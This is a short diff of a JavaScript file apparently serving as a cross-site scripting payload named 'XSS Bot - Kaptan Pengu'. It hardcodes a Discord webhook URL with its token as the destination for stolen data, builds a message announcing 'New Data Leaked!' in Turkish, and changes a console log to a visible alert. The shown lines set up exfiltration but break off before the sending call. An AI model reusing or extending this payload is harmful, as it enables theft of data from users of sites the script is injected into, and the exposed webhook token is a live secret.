@@ -1,6 +1,6 @@
 // GitHub: s.js
 const webhookURL = "https://discord.com/api/webhooks/1469278750876368947/evwkKVf6b9B0g50c-JVP0w3Zt3J00ZW6PiGcUfvUAlIrqHJ4C2DjnYMb3e1nHeYBYi0I";
-console.log("XSS Bot - Kaptan Pengu");
+alert("XSS Bot - Kaptan Pengu");
 const data = {
     username: "XSS Bot - Kaptan Pengu",
     content: "🚀 **Yeni Veri Sızdırıldı!**",
